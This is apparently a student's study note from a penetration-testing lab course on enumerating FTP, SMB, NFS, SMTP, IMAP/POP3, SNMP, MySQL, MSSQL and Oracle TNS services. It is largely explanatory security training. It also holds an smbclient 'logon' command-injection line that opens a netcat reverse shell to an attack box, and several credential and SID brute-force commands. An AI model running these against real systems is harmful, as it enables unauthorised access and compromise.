![[Pasted image 20240701191819.png]]


### Host Based Enumeration





# ==FTP==

##### Connection Establishment 

- **Control Channel (TCP 21):**
    
    - Established first between client and server.
    - Used for sending commands and receiving status codes.
- **Data Channel (TCP 20):**
    
    - Established after the control channel.
    - Used exclusively for data transmission.
    - Monitors for errors and allows resuming if the connection is broken.



#### Active VS Passive Mode

#### Active FTP:

- **Control Channel:** Client connects to server on TCP port 21.
- **Data Channel:** Server connects to a client-specified port.
- **Issue:** Client-side firewall may block the server's attempt to establish the data channel.

#### Passive FTP:

- **Control Channel:** Client connects to server on TCP port 21.
- **Data Channel:** Server specifies a port for the client to connect.
- **Advantage:** Since the client initiates both connections, it is less likely to be blocked by the client-side firewall.



### TFTP (Trivial File Transfer Protocol)

1. **Simplicity:**
    
    - Simpler than FTP.
    - Performs file transfers between client and server processes.
2. **Lack of Authentication:**
    
    - No user authentication.
    - No support for protected login via passwords.
3. **UDP Usage:**
    
    - Uses UDP (User Datagram Protocol) instead of TCP.
    - UDP is connectionless and unreliable.
4. **Application Layer Recovery:**
    
    - Implements reliability at the application layer.
    - Uses acknowledgments, retransmissions, and sequence numbers to ensure data integrity and order.
5. **Permissions:**
    
    - Operates based on file read and write permissions in the OS.
    - Works only with directories and files shared with all users.
    - Files must be globally readable and writable.
6. **Security Limitations:**
    
    - Due to lack of security features, TFTP is only suitable for use in local and protected networks.
    - Not recommended for use over public or unsecured networks.
7. **Usage Context:**
    
    - Commonly used for tasks like network booting and transferring configuration files in a secure local environment.



## Default Configuration

- configuration of vsFTPd can be found in `/etc/vsftpd.conf`

#### vsFTPd Config File


```shell
cat /etc/vsftpd.conf | grep -v "#"
```

  

|**Setting**|**Description**|
|---|---|
|`listen=NO`|Run from inetd or as a standalone daemon?|
|`listen_ipv6=YES`|Listen on IPv6 ?|
|`anonymous_enable=NO`|Enable Anonymous access?|
|`local_enable=YES`|Allow local users to login?|
|`dirmessage_enable=YES`|Display active directory messages when users go into certain directories?|
|`use_localtime=YES`|Use local time?|
|`xferlog_enable=YES`|Activate logging of uploads/downloads?|
|`connect_from_port_20=YES`|Connect from port 20?|
|`secure_chroot_dir=/var/run/vsftpd/empty`|Name of an empty directory|
|`pam_service_name=vsftpd`|This string is the name of the PAM service vsftpd will use.|
|`rsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem`|The last three options specify the location of the RSA certificate to use for SSL encrypted connections.|
|`rsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.key`||
|`ssl_enable=NO`|


- ==/etc/ftpusers==  lists users to deny certain users access to the FTP service

## Dangerous Settings

|**Setting**|**Description**|
|---|---|
|`anonymous_enable=YES`|Allowing anonymous login?|
|`anon_upload_enable=YES`|Allowing anonymous to upload files?|
|`anon_mkdir_write_enable=YES`|Allowing anonymous to create new directories?|
|`no_anon_password=YES`|Do not ask anonymous for password?|
|`anon_root=/home/username/ftp`|Directory for anonymous.|
|`write_enable=YES`|Allow the usage of FTP commands: STOR, DELE, RNFR, RNTO, MKD, RMD, APPE, and SITE?|


|**Setting**|**Description**|
|---|---|
|`dirmessage_enable=YES`|Show a message when they first enter a new directory?|
|`chown_uploads=YES`|Change ownership of anonymously uploaded files?|
|`chown_username=username`|User who is given ownership of anonymously uploaded files.|
|`local_enable=YES`|Enable local users to login?|
|`chroot_local_user=YES`|Place local users into their home directory?|
|`chroot_list_enable=YES`|Use a list of local users that will be placed in their home directory?|

| **Setting**             | **Description**                                                                  |
| ----------------------- | -------------------------------------------------------------------------------- |
| `hide_ids=YES`          | All user and group information in directory listings will be displayed as "ftp". |
| `ls_recurse_enable=YES` | Allows the use of recurse listings.                                              |

### FTP Commands

- **Recursive Listing** `ls -R`
- **Download a File** - `get <filename>`
- **Download All Available Files** - `wget -m --no-passive ftp://<username>:<username>@10.129.14.136`
- **Upload a File** - `put <filename> `

## Footprinting the Service
- using nmap scripts found in `/usr/share/nmap/scripts/`

| Script Name                   | Use Case Description                                                     |
| ----------------------------- | ------------------------------------------------------------------------ |
| **ftp-syst.nse**              | Retrieves and displays the FTP server system information (SYST command). |
| **ftp-vsftpd-backdoor.nse**   | Detects the presence of the VSFTPD v2.3.4 backdoor vulnerability.        |
| **ftp-vuln-cve2010-4221.nse** | Checks for the ProFTPD 1.3.3c backdoor vulnerability (CVE-2010-4221).    |
| **ftp-proftpd-backdoor.nse**  | Detects backdoor accounts in ProFTPD servers.                            |
| **ftp-bounce.nse**            | Checks if the FTP server is vulnerable to FTP bounce attacks.            |
| **ftp-libopie.nse**           | Detects FTP servers that allow OPIE (One-time Passwords In Everything).  |
| **ftp-anon.nse**              | Checks if anonymous FTP login is allowed.                                |
| **ftp-brute.nse**             | Performs brute-force password auditing against FTP servers.              |

-  to trace the progress of NSE scripts `--script-trace`

#### Service Interaction

```shell
nc -nv 10.129.14.136 21
```

```shell
telnet 10.129.14.136 21
```

if the FTP server runs with TLS/SSL encryption 

```shell
openssl s_client -connect 10.129.14.136:21 -starttls ftp
```



# ==SMB==


- Shares resources (files, directories) within a LAN.
- Real-time updates for all users with access.
- uses TCP protocol and three-way handshake between client and server to connect

Refer this [SMB vs FTP](obsidian://open?vault=Spidey_Notes&file=NETWORKS%2FFTP%20VS%20SMB)


- **SMB shares**: Server file system parts accessible to clients.
- **ACLs(Access Control Lists)**: Define user/group permissions for shares.
- **ACLs for shares**: Independent of local file system permissions, allowing different network access rules.
	 1.  **Server's local permissions**: `C:\Projects` allows read/write.
	 2. **ACL for `ProjectsShare`**: Restricts access to specific users/groups, independent of local permissions.



- Samba SMB/CIFS on Linux.
- CIFS updated version of SMB
- Older =>  Windows 98 use SMB over [NetBIOS](obsidian://open?vault=Spidey_Notes&file=NETWORKS%2FNetBIOS) (TCP ports 137-139).
	- **Port 137**: Used for name resolution and registration.
	- **Port 138**: Used for connectionless datagram services.
	- **Port 139**: Used for session-based data transfer, file sharing and messaging after a session is established.
- Newer =>  Windows 10 use CIFS directly over TCP (port 445).







#### Default Configuration

```shell
cat /etc/samba/smb.conf | grep -v "#\|\;" 
```

#### Example Share

![[Pasted image 20240702182054.png]]

| **Setting**                    | **Description**                                                       |
| ------------------------------ | --------------------------------------------------------------------- |
| `[sharename]`                  | The name of the network share.                                        |
| `workgroup = WORKGROUP/DOMAIN` | Workgroup that will appear when clients query.                        |
| `path = /path/here/`           | The directory to which user is to be given access.                    |
| `server string = STRING`       | The string that will show up when a connection is initiated.          |
| `unix password sync = yes`     | Synchronize the UNIX password with the SMB password?                  |
| `usershare allow guests = yes` | Allow non-authenticated users to access defined share?                |
| `map to guest = bad user`      | What to do when a user login request doesn't match a valid UNIX user? |
| `browseable = yes`             | Should this share be shown in the list of available shares?           |
| `guest ok = yes`               | Allow connecting to the service without using a password?             |
| `read only = yes`              | Allow users to read files only?                                       |
| `create mask = 0700`           | What permissions need to be set for newly created files?              |





#### Commands
- Connecting to server and Listing shares
```shell-session
smbclient -N -L //10.129.14.128
```
- connect to a share
```shell-session
smbclient //10.129.14.128/notes
```
- Download Files
```shell-session
get prep-prod.txt 
```
- execute local system commands
```
!<cmd>
```
- From SMB server , get information of connected host
```shell-session
root@samba:~# smbstatus

Samba version 4.11.6-Ubuntu

PID     Username     Group        Machine                                        --------------------------------------------------
75691   sambauser    samba        10.10.14.4 (ipv4:10.10.14.4:45564)  

Protocol Version  Encryption           Signing              
---------------------------------------------------------------------------------
SMB3_11           -                    -                    

Service    pid     Machine       Connected at           Encryption   Signing     
---------------------------------------------------------------------------------
notes     75691   10.10.14.4    Do Sep 23 00:12:06 2021    CEST         -        
No locked files
```


#### FOOTPRINTING

-  Nmap
```bash 
nmap --script smb-protocols <IP>
```

-  rpcclient


```
rpcclient -U "" <IP>                       # If successful, then: 
```

| **Query**                 | **Description**                                                    |
| ------------------------- | ------------------------------------------------------------------ |
| `srvinfo`                 | Server information.                                                |
| `enumdomains`             | Enumerate all domains that are deployed in the network.            |
| `querydominfo`            | Provides domain, server, and user information of deployed domains. |
| `netshareenumall`         | Enumerates all available shares.                                   |
| `netsharegetinfo <share>` | Provides information about a specific share.                       |
| `enumdomusers`            | Enumerates all domain users.                                       |
| `queryuser <RID>`         | Provides information about a specific user.                        |


- Brute Forcing User RIDs
```shell-session
for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
```
Python script from [Impacket](https://github.com/SecureAuthCorp/impacket) called [samrdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/samrdump.py).



### smbclient



```
smbclient -L //<IP>//                  # Identify what all shares are present smbclient \\\\<IP>\\<share name>      # Null Authentication login 
smbclient --no-pass -L <IP>
```

### enum4linux


```
enum4linux -a <IP> | tee enum4linux.log    # Enumerate samba shares
```

```shell-session
enum4linux-ng 10.129.14.128 -A
```

### smbmap


```
smbmap -H <IP> 
smbmap -H <IP> -u '' -p '' # Enumerate samba share drives across a domain 
smbmap -H <IP> -s <Share name>
```


### crackmapexec


```
crackmapexec smb <IP> -u '' -p '' --shares 
crackmapexec smb <IP> -u 'sa' -p '' --shares 
crackmapexec smb <IP> -u 'sa' -p 'sa' --shares 
crackmapexec smb <IP> -u '' -p '' --share <Share name>
```

### ncrack


```
ncrack -T 5 <IP> -p smb -v -u <Username> -P /usr/bin/wordlists/rockyou.txt
```

### mount


```
mount -t cifs "//<IP>/share/" /mnt/wins 
mount -t cifs "//<IP>/share/" /mnt/wins -o vers=1.0,user=root,uid=0,gid=0
```

### smbclient (reverse shell)


```
smbclient -U "username%password" //<IP>/share_name   # After successful login: 
smb> logon "/=nc 'attack box IP' 4444 -e /bin/bash  # SMB shell to get a reverse shell 
smb> logon "/=`nohup nc -nv 10.10.14.6 4444 -e /bin/sh`"
```




# ==NFS==

### Network File System (NFS) 

- **Purpose**: Developed by Sun Microsystems to access files over a network as if they were local, similar to SMB but using a different protocol.
- **Compatibility**: Primarily used between Linux and Unix systems. NFS clients cannot communicate with SMB servers.

### ONC-RPC/SUN-RPC Protocol

- **Ports**: Utilizes TCP and UDP port 111.
- **Data Exchange**: Uses XDR (External Data Representation) for consistent data exchange between different systems.

### Authentication and Authorization

- **Authentication**: Managed by the RPC protocol, not directly by NFS.
- **Authorization**: Based on file system information and UNIX UID/GID mappings.
- **Potential Issue**: Different UID/GID mappings between client and server can pose security risks, especially in untrusted networks.




## Default Configuration

```shell-session
cat /etc/exports 
```
- **Folder Sharing**: A folder is specified and made available to others via NFS.
- **Access Rights**: Rights to the NFS share are assigned based on the host or subnet.
- **Additional Options**: Extra options can be applied to specific hosts or subnets to customize access.


| **Additional Option** | **Description**                                                                                                                             |
| --------------------- | ------------------------------------------------------------------------------------------------------------------------------------------- |
| `rw`                  | Read and write permissions.                                                                                                                 |
| `ro`                  | Read only permissions.                                                                                                                      |
| `sync`                | Synchronous data transfer. (A bit slower)                                                                                                   |
| `async`               | Asynchronous data transfer. (A bit faster)                                                                                                  |
| `secure`              | Ports above 1024 will not be used.                                                                                                          |
| `insecure`            | Ports above 1024 will be used.                                                                                                              |
| `no_subtree_check`    | This option disables the checking of subdirectory trees.                                                                                    |
| `root_squash`         | Assigns all permissions to files of root UID/GID 0 to the UID/GID of anonymous, which prevents `root` from accessing files on an NFS mount. |


### Example

-  ExportFS (Exporting File System)
	syntax:
	  **_Directory         Host-IP(Option-list)_**
 
```shell-session
root@nfs:~# echo '/mnt/nfs  10.129.14.0/24(sync,no_subtree_check)' >> /etc/exports
root@nfs:~# systemctl restart nfs-kernel-server 
root@nfs:~# exportfs

/mnt/nfs      	10.129.14.0/24
```
shared the folder `/mnt/nfs` to the subnet `10.129.14.0/24` with setting



## Dangerous Settings

|**Option**|**Description**|
|---|---|
|`rw`|Read and write permissions.|
|`insecure`|Ports above 1024 will be used.|
|`nohide`|If another file system was mounted below an exported directory, this directory is exported by its own exports entry.|
|`no_root_squash`|All files created by root are kept with the UID/GID 0.|


### Commands

- Show Available NFS Shares
```shell-session
showmount -e 10.129.14.128
```
- Mounting NFS Share
```shell-session
pradyun2005@htb[/htb]$ mkdir target-NFS
pradyun2005@htb[/htb]$ sudo mount -t nfs 10.129.18.99:/ ./target-NFS/ -o nolock
pradyun2005@htb[/htb]$ cd target-NFS
pradyun2005@htb[/htb]$ tree .

.
└── mnt
    └── nfs
        ├── id_rsa
        ├── id_rsa.pub
        └── nfs.share

2 directories, 3 files
```
- List Contents with Usernames & Group Names
```shell-session
ls -l mnt/nfs/
```
- List Contents with UIDs & GUIDs
```shell-session
ls -n mnt/nfs/
```
- Unmounting
```shell-session
sudo umount ./target-NFS
```
- get summary of mounted share
```shell
df -h
```

### FOOTPRINTING

- nmap
```shell
sudo nmap 10.129.14.128 -p111,2049 -sV -sC
```
```shell
sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049
```



[PRIV ESC via NFS SHARE](https://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/)


## SKILL ASSESMENT
![[Pasted image 20240703150506.png]]





# ==[SMTP](obsidian://open?vault=Spidey_Notes&file=NETWORKS%2FPROTOCOL%2FSMTP) ==

 - protocol for sending emails in an IP network.
 - combined with the IMAP or POP3 to fetch emails and send emails.
 - SMTP connection requests  port `25`. , newer SMTP  port `587`.

- `STARTTLS` command to upgrade from plaintext to encrypted communication


### EMAIL DELIVERY PROCESS

#### Mail User Agent (MUA):

- **Role**: Email client for composing, sending, and receiving emails (e.g., Outlook, Thunderbird, Gmail).
- **Function**: Creates email headers and body.

#### Mail Submission Agent (MSA):

- **Role**: Receives email from MUA (e.g., `smtp.gmail.com`).
- **Function**:
    - Validates email and authenticates sender using SMTP-Auth.
    - Forwards validated email to the MTA.

#### Mail Transfer Agent (MTA):

- **Role**: Transmits emails between servers.
- **Function**:
    - Receives email from MSA.
    - Checks for size, spam, and other criteria.
    - Uses DNS to find recipient’s mail server.
    - Delivers email to recipient’s MTA.

#### Preventing Spam with Authentication:

- **Method**: Extended SMTP (ESMTP) with SMTP-Auth.
- **Purpose**: Ensures only authorized users can send emails to prevent spam.

#### Open Relay and Relay Server:

- **Relay Server (MSA)**: Validates email origin before forwarding to MTA.
- **Open Relay**: An MTA incorrectly configured to allow unauthenticated email sending, leading to spam.
- **Prevention**: Proper configuration requiring authentication and sender verification.

#### Final Delivery:

- **Process**:
    - Recipient’s MTA reassembles email.
    - Mail Delivery Agent (MDA) stores email in recipient’s mailbox.
    - Recipient accesses email using POP3 or IMAP.



```
Client (MUA) ➞ Submission Agent (MSA) ➞ Mail Transfer Agent (MTA) ➞ Mail Delivery Agent (MDA) ➞ Mailbox (POP3/IMAP)
```



## Default Configuration


```shell-session
cat /etc/postfix/main.cf | grep -v "#" | sed -r "/^\s*$/d"
```




### SMTP COMMANDS

|**Command**|**Description**|
|---|---|
|`AUTH PLAIN`|AUTH is a service extension used to authenticate the client.|
|`HELO`|The client logs in with its computer name and thus starts the session.|
|`MAIL FROM`|The client names the email sender.|
|`RCPT TO`|The client names the email recipient.|
|`DATA`|The client initiates the transmission of the email.|
|`RSET`|The client aborts the initiated transmission but keeps the connection between client and server.|
|`VRFY`|The client checks if a mailbox is available for message transfer.|
|`EXPN`|The client also checks if a mailbox is available for messaging with this command.|
|`NOOP`|The client requests a response from the server to prevent disconnection due to time-out.|
|`QUIT`|The client terminates the session.|

### Intreact with the SMTP server
- using TELNET

```shell-session
telnet 10.129.14.128 25
```

- using WEB PROXY

```shell
CONNECT 10.129.14.128:25 HTTP/1.0
```


#### Interaction
 
- **HELO**: Identifies the client to the server in SMTP.
- **EHLO**: Identifies the client and requests server's ESMTP features.

![[Pasted image 20240703164040.png]]

- **VRFY** Enumerate users

![[Pasted image 20240703164143.png]]




- SENDING EMAIL via COMMAND LINE

```shell-session
pradyun2005@htb[/htb]$ telnet 10.129.14.128 25

Trying 10.129.14.128...
Connected to 10.129.14.128.
Escape character is '^]'.
220 ESMTP Server


EHLO inlanefreight.htb

250-mail1.inlanefreight.htb
250-PIPELINING
250-SIZE 10240000
250-ETRN
250-ENHANCEDSTATUSCODES
250-8BITMIME
250-DSN
250-SMTPUTF8
250 CHUNKING


MAIL FROM: <cry0l1t3@inlanefreight.htb>

250 2.1.0 Ok


RCPT TO: <mrb3n@inlanefreight.htb> NOTIFY=success,failure

250 2.1.5 Ok


DATA

354 End data with <CR><LF>.<CR><LF>

From: <cry0l1t3@inlanefreight.htb>
To: <mrb3n@inlanefreight.htb>
Subject: DB
Date: Tue, 28 Sept 2021 16:32:51 +0200
Hey man, I am trying to access our XY-DB but the creds don't work. 
Did you make any changes there?
.

250 2.0.0 Ok: queued as 6E1CF1681AB


QUIT

221 2.0.0 Bye
Connection closed by foreign host.
```



## Dangerous Settings

- Relay Server -> validates email orgin 
- Trusted SMTP Server -> recognized and verified by other mail servers ,not marked as spam

==My mail wont be in Spam , if i use trusted Relay server of recipient==

==sender authn before using relay server==

#### Open Relay Configuration

```shell-session
mynetworks = 0.0.0.0/0
```


- anyone on the internet can use the server to send emails 
- no authn required
- fake emails , phishing possible


## Footprinting the Service


```shell-session
sudo nmap 10.129.14.128 -sC -sV -p25
```

-  Nmap - Open Relay

```shell-session
sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v
```


# ==IMAP / POP3==



- SMTP sents email which is stored in SMTP server => copy these MAILS to IMAP/POP3 server to give access to clients

| Feature/Functionality   | IMAP                                                                                               | POP3                                                                                               |
| ----------------------- | -------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------- |
| **Purpose**             | Online management of emails directly on the server.                                                | Basic retrieval of emails from the server.                                                         |
| **Folder Structures**   | Supports creation and management of folders.                                                       | Does not support folder structures.                                                                |
| **Synchronization**     | Allows synchronization of emails across multiple devices and clients.                              | Does not support synchronization across multiple devices.                                          |
| **Client-Server Based** | Acts as a network file system for emails.                                                          | Simple download-and-delete model.                                                                  |
| **Advanced Features**   | Supports hierarchical mailboxes, access to multiple mailboxes, and email preselection.             | Lacks advanced functionalities like hierarchical mailboxes and email preselection.                 |
| **Listing Emails**      | Lists emails directly on the server, allowing online management.                                   | Lists emails stored on the server.                                                                 |
| **Retrieving Emails**   | Retrieves and keeps emails on the server, allowing access from multiple devices.                   | Downloads emails to the local client, typically deleting them from the server afterwards.          |
| **Deleting Emails**     | Can manage deletion of emails both locally and on the server.                                      | Can delete emails from the server after retrieval.                                                 |
| **Use Case**            | Ideal for users who access their email from multiple devices (e.g., computer, smartphone, tablet). | Suitable for users who access their email from a single device and prefer to store emails locally. |


- **Port 143**: Client-server connection for IMAP.
- **Text Commands**: Uses ASCII format for commands.
- **Multiple Commands**: Commands can be sent successively; server confirmations matched with identifiers.
- **Authentication**: Requires user name and password for access to mailbox.


## Default Configuration

- `dovecot-imapd`, and `dovecot-pop3d`



#### IMAP Commands

| **Command**                     | **Description**                                                                                               |
| ------------------------------- | ------------------------------------------------------------------------------------------------------------- |
| `1 LOGIN username password`     | User's login.                                                                                                 |
| `1 LIST "" *`                   | Lists all directories.                                                                                        |
| `1 CREATE "INBOX"`              | Creates a mailbox with a specified name.                                                                      |
| `1 DELETE "INBOX"`              | Deletes a mailbox.                                                                                            |
| `1 RENAME "ToRead" "Important"` | Renames a mailbox.                                                                                            |
| `1 LSUB "" *`                   | Returns a subset of names from the set of names that the User has declared as being `active` or `subscribed`. |
| `1 SELECT INBOX`                | Selects a mailbox so that messages in the mailbox can be accessed.                                            |
| `1 UNSELECT INBOX`              | Exits the selected mailbox.                                                                                   |
| `1 FETCH <ID> all`              | Retrieves data associated with a message in the mailbox.                                                      |
| `1 CLOSE`                       | Removes all messages with the `Deleted` flag set.                                                             |
| `1 LOGOUT`                      | Closes the connection with the IMAP server.                                                                   |

#### POP3 Commands

|**Command**|**Description**|
|---|---|
|`USER username`|Identifies the user.|
|`PASS password`|Authentication of the user using its password.|
|`STAT`|Requests the number of saved emails from the server.|
|`LIST`|Requests from the server the number and size of all emails.|
|`RETR id`|Requests the server to deliver the requested email by ID.|
|`DELE id`|Requests the server to delete the requested email by ID.|
|`CAPA`|Requests the server to display the server capabilities.|
|`RSET`|Requests the server to reset the transmitted information.|
|`QUIT`|Closes the connection with the POP3 server.|



## Dangerous Settings

|**Setting**|**Description**|
|---|---|
|`auth_debug`|Enables all authentication debug logging.|
|`auth_debug_passwords`|This setting adjusts log verbosity, the submitted passwords, and the scheme gets logged.|
|`auth_verbose`|Logs unsuccessful authentication attempts and their reasons.|
|`auth_verbose_passwords`|Passwords used for authentication are logged and can also be truncated.|
|`auth_anonymous_username`|This specifies the username to be used when logging in with the ANONYMOUS SASL mechanism.|
## Footprinting the Service

- `110`, `143`, `993`,  `995`  used for IMAP and POP3
- two higher (`993`,`995`) used with encryption `TLS/SSL`

### Interaction

- cURL
```shell-session
curl -k 'imaps://10.129.14.128' --user user:p4ssw0rd
```
to see how connection is made use `-v`

- OpenSSL - TLS Encrypted

```shell-session
openssl s_client -connect 10.129.14.128:pop3s
```

```shell-session
openssl s_client -connect 10.129.14.128:imaps
```


[IMAP COMMANDS](https://www.mailenable.com/kb/content/article.asp?ID=ME020711)


# ==SNMP==


[SNMP](obsidian://open?vault=Spidey_Notes&file=NETWORKS%2FPROTOCOL%2FSNMP)
- protocol for monitoring and managing network devices
- transmits control commands over UDP port `161`
- traps UDP port `162` => a specific event occurs on the server-side sent to client side 

- **Community String** like a password used to control access to SNMP devices
	- RO community string
	- RW community string

## Default Configuration


```shell-session
cat /etc/snmp/snmpd.conf | grep -v "#" | sed -r '/^\s*$/d'
```

### Dangerous Settings


|**Settings**|**Description**|
|---|---|
|`rwuser noauth`|Provides access to the full OID tree without authentication.|
|`rwcommunity <community string> <IPv4 address>`|Provides access to the full OID tree regardless of where the requests were sent from.|
|`rwcommunity6 <community string> <IPv6 address>`|Same access as with `rwcommunity` with the difference of using IPv6.|


### Footprinting the service


`snmpwalk`, `onesixtyone`, and `braa`


-  [braa](https://github.com/mteg/braa) to brute-force the individual OIDs and enumerate the information

- `Onesixtyone` can be used to brute-force the names of the community string using `/opt/useful/SecLists/Discovery/SNMP/snmp.txt`


- SNMPwalk
```shell-session
snmpwalk -v2c -c public 10.129.14.128
```
for version v2c

- OneSixtyOne
```shell-session
onesixtyone -c /opt/useful/SecLists/Discovery/SNMP/snmp.txt 10.129.14.128
```

- braa
```shell-session
braa <community string>@<IP>:.1.3.6.* 
```




# ==MySQL==


## Default Configuration

```shell-session
cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | sed -r '/^\s*$/d'
```
## Dangerous Settings

|**Settings**|**Description**|
|---|---|
|`user`|Sets which user the MySQL service will run as.|
|`password`|Sets the password for the MySQL user.|
|`admin_address`|The IP address on which to listen for TCP/IP connections on the administrative network interface.|
|`debug`|This variable indicates the current debugging settings|
|`sql_warnings`|This variable controls whether single-row INSERT statements produce an information string if warnings occur.|
|`secure_file_priv`|This variable is used to limit the effect of data import and export operations.|


## Footprinting the Service

- nmap
```shell-session
sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*
```
#### Interaction with the MySQL Server
- mysql cli
```shell-session
mysql -u root -pP4SSw0rd -h 10.129.14.128
```


|**Command**|**Description**|
|---|---|
|`mysql -u <user> -p<password> -h <IP address>`|Connect to the MySQL server. There should **not** be a space between the '-p' flag, and the password.|
|`show databases;`|Show all databases.|
|`use <database>;`|Select one of the existing databases.|
|`show tables;`|Show all available tables in the selected database.|
|`show columns from <table>;`|Show all columns in the selected database.|
|`select * from <table>;`|Show everything in the desired table.|
|`select * from <table> where <column> = "<string>";`|Search for needed `string` in the desired table.|



# ==MSSQL==

- written to run on Windows operating systems
- building applications that run on Microsoft's .NET framework due to its strong native support for .NET use MSSQL


- [SQL Server Management Studio](https://docs.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms?view=sql-server-ver15) (`SSMS`) comes as a feature that can be installed with the MSSQL install package to manage by admins



other used to access are


|[mssql-cli](https://docs.microsoft.com/en-us/sql/tools/mssql-cli?view=sql-server-ver15)|[SQL Server PowerShell](https://docs.microsoft.com/en-us/sql/powershell/sql-server-powershell?view=sql-server-ver15)|[HeidiSQL](https://www.heidisql.com/)|[SQLPro](https://www.macsqlclient.com/)|[Impacket's mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py)|



#### MSSQL Databases

|Default System Database|Description|
|---|---|
|`master`|Tracks all system information for an SQL server instance|
|`model`|Template database that acts as a structure for every new database created. Any setting changed in the model database will be reflected in any new database created after changes to the model database|
|`msdb`|The SQL Server Agent uses this database to schedule jobs & alerts|
|`tempdb`|Stores temporary objects|
|`resource`|Read-only database containing system objects included with SQL server|


## Default Configuration




- **Service Account**: MSSQL runs under `NT SERVICE\MSSQLSERVER`.
- **Windows Authentication**: Uses the OS to authenticate against local SAM or Active Directory.
- **Active Directory Benefits**: Centralized auditing and access control.
- **Risks**: Compromised accounts can lead to privilege escalation and lateral movement.
- **Default Encryption**: Not enforced by default; requires explicit configuration.




- MSSQL clients not using encryption to connect to the MSSQL server
    
- The use of self-signed certificates when encryption is being used. It is possible to spoof self-signed certificates
    
- The use of [named pipes](https://docs.microsoft.com/en-us/sql/tools/configuration-manager/named-pipes-properties?view=sql-server-ver15)
    
- Weak & default `sa` credentials. Admins may forget to disable this account




## Footprinting the Service

- NMAP
```shell-session
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248
```


- Metasploit
```shell-session
auxiliary(scanner/mssql/mssql_ping) > set rhosts 10.129.201.248


run
```


### Interaction Via mssqlclient.py


```
locate mssqlclient
```

```shell-session
python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth
```


# ==Oracle TNS==
- `Transparent Network Substrate` (`TNS`)
- communication between Oracle databases and applications over networks
- built-in encryption mechanism


## Default Configuration

- `TCP/1521` port
- `tnsnames.ora` and `listener.ora`    located in the `$ORACLE_HOME/network/admin` 
-  database or service has a unique entry in the [tnsnames.ora](https://docs.oracle.com/cd/E11882_01/network.112/e10835/tnsnames.htm#NETRF007) file
	- name for the service
	- the network location of the service
	- database or service name used while connecting


- **Tnsnames.ora**
``` ora
ORCL =
  (DESCRIPTION =
    (ADDRESS_LIST =
      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
    )
    (CONNECT_DATA =
      (SERVER = DEDICATED)
      (SERVICE_NAME = orcl)
    )
  )





Service Name: ORCL
Listening Port: TCP/1521
IP Address: 10.129.11.102
Client Connection: Clients should use the service name orcl to connect.
```


- `listener.ora` server-side configuration file  
	-  Receives incoming client connection requests.
	- Forwards requests to the appropriate Oracle database instance.

> **`tnsnames.ora`**: Used by clients to find database addresses.
> **`listener.ora`**: Used by the listener to manage and route client requests.


- listener.ora
```txt
SID_LIST_LISTENER =
  (SID_LIST =
    (SID_DESC =
      (SID_NAME = PDB1)
      (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)
      (GLOBAL_DBNAME = PDB1)
      (SID_DIRECTORY_LIST =
        (SID_DIRECTORY =
          (DIRECTORY_TYPE = TNS_ADMIN)
          (DIRECTORY = C:\oracle\product\19.0.0\dbhome_1\network\admin)
        )
      )
    )
  )

LISTENER =
  (DESCRIPTION_LIST =
    (DESCRIPTION =
      (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))
      (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))
    )
  )

ADR_BASE_LISTENER = C:\oracle
```



- **PL/SQL Exclusion List**: A user-created text file that specifies which PL/SQL packages or types should be blocked from execution.
- **File Location**: `$ORACLE_HOME/sqldeveloper`
- **Usage**: Enhances security by restricting access to specified PL/SQL objects.


|**Setting**|**Description**|
|---|---|
|`DESCRIPTION`|A descriptor that provides a name for the database and its connection type.|
|`ADDRESS`|The network address of the database, which includes the hostname and port number.|
|`PROTOCOL`|The network protocol used for communication with the server|
|`PORT`|The port number used for communication with the server|
|`CONNECT_DATA`|Specifies the attributes of the connection, such as the service name or SID, protocol, and database instance identifier.|
|`INSTANCE_NAME`|The name of the database instance the client wants to connect.|
|`SERVICE_NAME`|The name of the service that the client wants to connect to.|
|`SERVER`|The type of server used for the database connection, such as dedicated or shared.|
|`USER`|The username used to authenticate with the database server.|
|`PASSWORD`|The password used to authenticate with the database server.|
|`SECURITY`|The type of security for the connection.|
|`VALIDATE_CERT`|Whether to validate the certificate using SSL/TLS.|
|`SSL_VERSION`|The version of SSL/TLS to use for the connection.|
|`CONNECT_TIMEOUT`|The time limit in seconds for the client to establish a connection to the database.|
|`RECEIVE_TIMEOUT`|The time limit in seconds for the client to receive a response from the database.|
|`SEND_TIMEOUT`|The time limit in seconds for the client to send a request to the database.|
|`SQLNET.EXPIRE_TIME`|The time limit in seconds for the client to detect a connection has failed.|
|`TRACE_LEVEL`|The level of tracing for the database connection.|
|`TRACE_DIRECTORY`|The directory where the trace files are stored.|
|`TRACE_FILE_NAME`|The name of the trace file.|
|`LOG_FILE`|The file where the log information is stored.|



- **SID** is like a name tag for each database instance
	- instance=>set of processes and memory used to manage a database's data.
- Clients use the SID to connect to the correct instance.
- Admins use it to manage and monitor specific instances.




## Footprinting

- Nmap
```shell-session
sudo nmap -p1521 -sV 10.129.204.235 --open
```

```shell-session
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
```
SID bruteforcing


- ODAT
```shell-session
odat all -s 10.129.204.235
```

## Interaction

- SQLplus - Log In 
```shell-session
sqlplus scott/tiger@10.129.204.235/XE
